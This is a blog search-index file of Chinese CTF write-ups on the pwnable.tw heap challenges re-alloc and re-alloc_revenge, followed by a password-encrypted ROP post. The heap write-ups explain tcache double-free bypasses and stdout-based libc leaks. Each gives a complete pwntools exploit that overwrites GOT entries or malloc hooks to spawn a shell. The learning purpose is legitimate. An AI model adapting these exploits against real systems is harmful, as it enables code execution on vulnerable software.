<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn heap: re-alloc_revenge</title>
      <link href="/2020/03/18/pwn-heap-re-alloc-revenge/"/>
      <url>/2020/03/18/pwn-heap-re-alloc-revenge/</url>
      
        <content type="html"><![CDATA[<p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p><blockquote><p>题目描述</p></blockquote><p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled</code></pre><p>功能就不赘述了，因为binary和re-alloc一摸一样。</p><blockquote><p>相关知识点</p></blockquote><h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p><pre><code class="C">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow </code></pre><p>分析<code>_IO_new_file_overflow</code>源码：</p><pre><code class="C">int _IO_new_file_overflow (FILE *f, int ch){    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_NO_WRITES&quot;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    {        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return EOF;    }       // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_CURRENTLY_PUTTING&quot;    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    {        /* Allocate a buffer if needed. */        if (f-&gt;_IO_write_base == NULL)        {            _IO_doallocbuf (f);            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);        }        if (__glibc_unlikely (_IO_in_backup (f)))        {            size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;            _IO_free_backup_area (f);            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;        }        if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;        if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    }    if (ch == EOF)        // 需要调用的目标&quot;_IO_do_write&quot;，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处        // 存在有价值的地址 （libc 地址）则可进行泄露        // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖&quot;_IO_write_base&quot;低字节为&quot;\x00&quot;)        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */        if (_IO_do_flush (f) == EOF)            return EOF;    *f-&gt;_IO_write_ptr++ = ch;    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#39;\n&#39;))        if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)             return EOF;    return (unsigned char) ch;}</code></pre><p>在<code>_IO_new_file_overflow</code>中，我们要利用的就是其中的<code>_IO_do_write</code>。<br><br>在输出时，如果具有缓冲区，会输出<code>_IO_write_base</code>开始的缓冲区内容，直到<code>_IO_write_ptr</code>（也就是将<code>_IO_write_base</code>一直到<code>_IO_write_ptr</code>部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是libc中），但是在<code>setbuf</code>后，理论上会不使用缓冲区。然而如果能够修改<code>_IO_2_1_stdout_</code>结构体的<code>flags</code>部分，使得其认为<code>stdout</code>具有缓冲区，再将<code>_IO_write_base</code>处的值进行<code>partial overwrite</code>，就可以泄露出libc地址了。<br><br>为了设置对应的<code>flags</code>的值，需要进一步分析<code>_IO_do_write</code>(其实就是<code>_IO_new_do_write</code>)：</p><pre><code class="C">int _IO_new_do_write (FILE *fp, const char *data, size_t to_do){    return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;}static size_t new_do_write (FILE *fp, const char *data, size_t to_do){    size_t count;    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)        fp-&gt;_offset = _IO_pos_BAD;    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    {        // &quot;_IO_SYSSEEK&quot;只是简单的调用lseek，但是我们不能完全控制&quot;fp-&gt;_IO_write_base - fp-&gt;_IO_read_end&quot;的值。        // 如果&quot;fp-&gt;_IO_read_end&quot;的值设置为0，那么&quot;_IO_SYSSEEK&quot;的第二个参数值就会过大;        // 如果设置&quot;fp-&gt;_IO_write_base = fp-&gt;_IO_read_end&quot;的话，那么在其它地方就会有问题，因为&quot;fp-&gt;_IO_write_base&quot;不能大于&quot;fp-&gt;_IO_write_end&quot;。        // 所以这里要设置&quot;fp-&gt;_flags | _IO_IS_APPENDING&quot;，避免进入else if分支。        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);        if (new_pos == _IO_pos_BAD)            return 0;        fp-&gt;_offset = new_pos;    }    // 需要的目标&quot;_IO_SYSWRITE&quot;    count = _IO_SYSWRITE (fp, data, to_do);    if (fp-&gt;_cur_column &amp;&amp; count)        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);    return count;}</code></pre><p>综上可以得到，<code>flags</code>需要满足的条件为：</p><pre><code class="C">_flags = 0xfbad0000                 // Magic number_flags &amp; = ~_IO_NO_WRITES           // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING    // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING         // _flags = 0xfbad1800</code></pre><p>同时可以将<code>_IO_read_ptr</code>, <code>_IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code>设置为：</p><pre><code class="C">_IO_read_ptr = 0;_IO_read_end = 0;_IO_read_base = 0;_IO_write_base = 0x7fXXXXXXXX00;</code></pre><p>然后就可以根据输出的数据leak出libc地址了。</p><blockquote><p>利用思路</p></blockquote><ul><li>利用<code>alloc</code>功能在<code>size=0</code>时存在的uaf，以及<code>realloc</code>中当<code>size &lt; old_size</code>而触发的<code>free(remainder)</code>操作，形成chunk overlap，然后覆盖chunk的size至足够放进unsorted bin中（这里因为要爆破而且连远程的延迟比较大，所以尽量小）。</li><li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<pre><code class="C">if (__glibc_unlikely (!prev_inuse(nextchunk)))  malloc_printerr (&quot;double free or corruption (!prev)&quot;);</code></pre></li><li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<pre><code>tcache bin ==&gt; +--------+ &lt;--victim_chunk                      tcache bin ==&gt; +--------+&lt;--same victim_chunk             |        |                   after malloc                      |        |             +--------+&lt;--+            ===================&gt;                 +--------+             |fd |    |   |                                                 |        |             +--------+   |                                                 +--------+               |          |               +----------+</code></pre></li><li>进一步地，由于<code>alloc</code>会对输入地字符串强制添加末尾<code>\x00</code>，从而会将上一步中提到的double free链（也就是该tache bin的fd）的低字节覆盖为<code>\x00</code>，这里需要将该chunk的地址保持为低字节是<code>\x00</code>，从而即使低字节被覆盖也不影响double free链，而做法就是在最开始得时候分配一定size的chunk并free到tcache中去（其实这里的chunk在最后的exploite也会用到，因为那时unsorted bin已经被破坏了，不能分配tcache或者fastbin中没有的chunk，否则会造成从unsorted bin中取而报错）。</li><li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<pre><code class="shell">tcache bin ==&gt; +--------+ &lt;--victim_chunk             |             |        |                               |             +--------+                               |             |fd |    |                               |             +--------+                               |               |                                      |               +----------&gt; +--------+ &lt;--stdout      |                            |_flags  |                |                            +--------+                |                            |        |                |                            +--------+                |   after malloc----------------------------------------------------- +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdoutunsorted bin ==&gt; +--------+ &lt;--same victim_chunk      |                                |_flags  |               |        |                             |                                +--------+               +--------+                             |                                |        |               |fd | bk |--------&gt; main_arena         |                                +--------+                       +--------+                             |                                          |                                    |                 +----------&gt; +--------+ &lt;--stdout    |                              |_flags  |              |                              +--------+              |                              |        |              |                              +--------+              |                  </code></pre></li><li>这个时候只要分配stdout出的chunk就能修改相应的stdout结构体，达到输出数据从而leak libc的目的。</li><li>之后因为unsorted bin被破坏的缘故，并且仅能使用一个heap进行exploite（另一个heap不能被free，否则会报错）和只能通过bins中已有的chunk进行利用，分配到<code>__realloc_hook</code>处的chunk，将<code>__realloc_hook</code>改为<code>malloc</code>，再将<code>__malloc_hook</code>改为<code>one_gadget</code>（为了调整栈帧，使得<code>[rsp + 0x70] == NULL</code>。</li><li>触发<code>realloc</code>来getshell。</li></ul><blockquote><p>exp</p></blockquote><pre><code class="python"># context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))offset = 0x1e7570realloc_hook_offset = libc.symbols[&quot;__realloc_hook&quot;]malloc_offset = libc.symbols[&quot;malloc&quot;]one_gadget_offset = 0x106ef8while True:    try:        # make the lowest byte of bins[1]&#39;s address be \x00        # also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache        alloc(0, 0x28, &quot;AAAA&quot;)        free(0)        alloc(0, 0x48, &quot;AAAA&quot;)        free(0)        # three freed tcache bins size = [0x60, 0x40, 0x20]        # bins[0] and bins[2] have the same address (both size area are 0x20)        # bins[1] is right next to bins[0] and bins[2]        alloc(0, 0x58, &quot;AAAA&quot;)        realloc(0, 0, &quot;&quot;)        realloc(0, 0x18, &quot;BBBB&quot;)        free(0)        # make double free on bins[1]        # thus we can use two same chunk on size 0x40 for the following exploit        alloc(0, 0x38, &quot;AAAA&quot;)        realloc(0, 0, &quot;&quot;)        alloc(1, 0x38, &quot;BBBB&quot;)        free(0)        realloc(1, 0x38, &quot;B&quot; * 0x10)        free(1)        # alloc space for unsorted bin        # make fake unstored bin&#39;s next chunk point to exactly a valid chunk        # free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)        for i in range(9):            alloc(1, 0x68, &quot;AAAA&quot;)            realloc(1, 0x78, &quot;AAAA&quot;)            free(1)        # alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)        # then alloc bins[1] and free it to unsorted bin        alloc(0, 0x58, &quot;D&quot; * 0x18 + p64(0x441))        free(0)        alloc(1, 0x38, &quot;DDDD&quot;)        realloc(1, 0, &quot;&quot;)        # partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)        # make the tcache bins whose size is 0x40 point to stdout        realloc(1, 0x38, p16(0x5760))        alloc(0, 0x38, &quot;DDDD&quot;)        # alloc the chunk at stdout        # make _flags = 0x7fdf0ec12760 ... to invoke data print        # _flags = MAGIC                    # 0xfbad0000         # _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000         # _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800        # _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800        # _IO_read_ptr = 0,         # _IO_read_end = 0,         # _IO_read_base = 0        # _IO_write_base = 0x7ffff7dd0700        # _IO_write_ptr = 0x7ffff7dd07e3        # thus data between _IO_write_base and _IO_write_ptr will be print out        realloc(0, 0x18, &quot;AAAA&quot;)        free(0)        alloc(0, 0x38, p64(0xfbad1800) + p64(0) * 3)        # leak libc        string = p.recv(16)        print(string)        if string[0] == &quot;$&quot;:            p.close()            if _pwn_remote == 0:                p = process(argv=[_proc], env=_setup_env())            else:                p = remote(&#39;chall.pwnable.tw&#39;, 10310)            if _debug != 0:                gdb.attach(p)            continue        libc_addr = u64(string[8:])        libc_base = libc_addr - offset        realloc_hook = libc_base + realloc_hook_offset        libc_malloc = libc_base + malloc_offset        one_gadget = libc_base + one_gadget_offset        break    except:        p.close()        if _pwn_remote == 0:            p = process(argv=[_proc], env=_setup_env())        else:            p = remote(&#39;chall.pwnable.tw&#39;, 10310)        if _debug != 0:            gdb.attach(p)success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;realloc_hook: &quot; + hex(realloc_hook))success(&quot;libc_malloc: &quot; + hex(libc_malloc))success(&quot;one_gadget: &quot; + hex(one_gadget))# make heap[1] == NULL (cannot use heap[0] any more)realloc(1, 0x18, &quot;A&quot; * 0x10)free(1)# use the 0x80 tcache and prepared tcache# create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)alloc(1, 0x78, &quot;AAAA&quot;)realloc(1, 0, &quot;&quot;)realloc(1, 0x28, &quot;BBBB&quot;)free(1)# use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addralloc(1, 0x78, &quot;A&quot; * 0x28 + p64(0x51) + p64(realloc_hook))realloc(1, 0x18, &quot;AAAA&quot;)free(1)# make tcache bins in size 0x50 point to realloc_hookalloc(1, 0x48, &quot;AAAA&quot;)realloc(1, 0x18, &quot;BBBB&quot;)free(1)# make realloc_hook = malloc, malloc_hook = one_gadget# then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)# because three &quot;push&quot;&#39;s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL alloc(1, 0x48, p64(libc_malloc) + p64(one_gadget))# use realloc to triggerrealloc(1, 0, &quot;&quot;)# use vps to get flag# p.sendline(&quot;cat /home/re-alloc_revenge/flag&quot;)# print(p.recv())p.interactive()</code></pre><blockquote><p>小结</p></blockquote><ul><li>新姿势，<code>unsorted bin-&gt;fd</code>的partial overwrite改成<code>stdout</code>，在没有show的情况下进行leak libc</li><li>只有两个heap外加只有realloc操作再加各种崩坏的unsorted bin和tcache double free check，以及需要bruteforce，调试+写exp的过程对我来说那叫一个…</li><li>貌似还有一种改tcache struct的做法，目前还没研究，以后有时间搞一下</li></ul><blockquote><p>参考资料</p></blockquote><ol><li>思路来源，但是貌似这个脚本有问题：<a href="http://www.ntype.club/re-alloc_revenge/" target="_blank" rel="noopener">http://www.ntype.club/re-alloc_revenge/</a></li><li>改tcache stuct的做法（还没学着调过）：<a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/</a></li><li>利用stdout进行输出：<a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md</a></li><li>同上：<a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></li><li>glibc2.29源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.29/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: re-alloc</title>
      <link href="/2020/03/06/pwn-heap-re-alloc/"/>
      <url>/2020/03/06/pwn-heap-re-alloc/</url>
      
        <content type="html"><![CDATA[<p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p><blockquote><p>题目描述</p></blockquote><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>题目提供了四个功能</p><pre><code>1. alloc2. realloc3. free4. exit</code></pre><p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p><blockquote><p>相关知识点</p></blockquote><h3 id="libc2-29的tcache-double-free的检测机制"><a href="#libc2-29的tcache-double-free的检测机制" class="headerlink" title="libc2.29的tcache double free的检测机制"></a>libc2.29的tcache double free的检测机制</h3><pre><code class="C">//glibc-2.27typedef struct tcache_entry{  struct tcache_entry *next;} tcache_entry;//glibc-2.29typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;</code></pre><p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p><pre><code class="C">//glibc-2.27tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;}//glibc-2.29tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;    //new  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = NULL;    //new  return (void *) e;}</code></pre><p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p><h3 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h3><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li><li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li><li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li></ol><blockquote><p>利用思路</p></blockquote><ul><li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li><li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li><li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li><li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li></ul><blockquote><p>exp</p></blockquote><pre><code class="python">context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))bss = elf.bss(0)atoll_got = elf.got[&quot;atoll&quot;]atoll_plt = elf.plt[&quot;atoll&quot;]printf_plt = elf.plt[&quot;printf&quot;]libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 0xebsystem_offset = libc.symbols[&quot;system&quot;]# let tcache[0x20] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x18, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x18, p64(atoll_got))alloc(1, 0x18, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x38, &quot;CCC&quot;)free(0)realloc(1, 0x38, &quot;D&quot; * 0x10)free(1)# let tcache[0x50] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x48, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x48, p64(atoll_got))alloc(1, 0x48, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x58, &quot;CCC&quot;)free(0)realloc(1, 0x58, &quot;D&quot; * 0x10)free(1)# above all, we get two tcache point to atoll_got that can be malloc# alloc once at heap[0]# change the atoll_got to printf_plt# use format string bug to leak the __libc_start_main_ret in the stackalloc(0, 0x48, p64(printf_plt))p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;%21$llx&quot;)libc_start_main_ret = int(p.recv(12), 16)libc_base = libc_start_main_ret - libc_start_main_ret_offsetlibc_system = libc_base + system_offset# alloc twice at heap[1]# since the atoll has been set to printf# the return value of printf(which may be the length of the string) will be regarded as the &quot;Index&quot;# thus we use length of the string to make &quot;atoll&quot; work# then we change the atoll_got to libc_systemp.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;A\x00&quot;)p.sendafter(&quot;Size:&quot;, &quot;A&quot; * 15 + &quot;\x00&quot;)p.sendafter(&quot;Data:&quot;, p64(libc_system))# input &quot;/bin/sh\x00&quot; and call system(atoll) to get shellp.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;/bin/sh\x00&quot;)success(&quot;libc_start_main_ret: &quot; + hex(libc_start_main_ret))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))p.interactive()</code></pre><blockquote><p>小结</p></blockquote><ul><li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li><li>调试的时候gef好像有点问题，peda可以用。</li></ul><blockquote><p>参考资料</p></blockquote><ol><li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li><li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8da71199a0d997414970e1da8797c18f695ce28ec88a9acb62c8730492c47d75">f6952ccfaa400f44b040eedaf2486285bd7cf4547c6ccb6e3e3e004177a6b24a3721692928bb1a39e8a7740706d8f96e4f81e997e3d6ebcf703b5abe846eebbe0333b6b421479fc8ba2503529bd6536df5a015e6e8201f2e82c2031922a68056547b040cef0a901a89cc65a8f224fecf3a8d438eca75c94e92eef75288db2a52b1af4148541e470310f52450b0e2888a4774676dc8287edd7b12a034e233aaceea4d488f61d61a8e7b78076e0db3bf7763cb9cf8640aea304e3300b009c07ca5b8d03bc3be6a8cbbfb281159630a210f91641652b63f8276e02a81d88aae81fd28a9e8ef85032b9faa8d3ef042f609d324f4104a4d484a06aa50165208f30b6717ae9b6c3fc3ac16cfe133ef1a581dbaa8505ae7b759d6b42f0aed92cab98237b9ce0420f16c9695c176bb1eb63a18b6eb644d77cd89f7ff481666167c9a3fd933e997735734d4df98da24659315112633c2f67b724684d1f9265620db1ab825989a25c04a8574f1feef6e7e6c17e15db0aa1eb70f98e373a3e584e92d8f541a6efca1ddd337e988a3a6d624cdb3aecd1c129d908c6735fe1da613e9b91c0a1948b14f95d20be4c5b370411c8ddbd73d13c3536b1e96e9d587ae83cf7d4aeb1f58b69ead7b5aad32410e4c710a69569faba7dc09e9e5ded8659c1eb49332062378d93baaa514318d8c3383edecfe8cb70e3da60371ba97e46ce7fa14b211252caa51a534e0e424c0bec04d3d5e6a0eaffb94b5b0a21a2f594fd8532d741e21921fcdd08ff24e8908144e1d975dfa48d35ab96887330b0285720b0eb4ae0ab7665bb600840156ef58d200733fdfaffff1d0e472fe9b0a18ac3f6653098d38ae999f4309591244cc9b7218d6a6297c9e319be3c364edf708aadd1a150573df8bbf991e42188b1ae3fc582cc07245517d4d2a46c0334ff1dd4ff47418ab0ded71831b151fa3ee71c1f731db67bc56d3ce9d8217bad205ea63cc3fe328695e23c5bb1633a64e90aec3bdf2f90dc1ecacf4b145ed289feb052a4ced3263d2e5f1fb716fdc14af3f82d4958e6b11fa71c3a74a90ad69b7610c27aee13a9f1c4fec4fdbeba6d665553e39de0d4b11415b268ff986e118a3de5a4a9e1b98d5b4a14a0842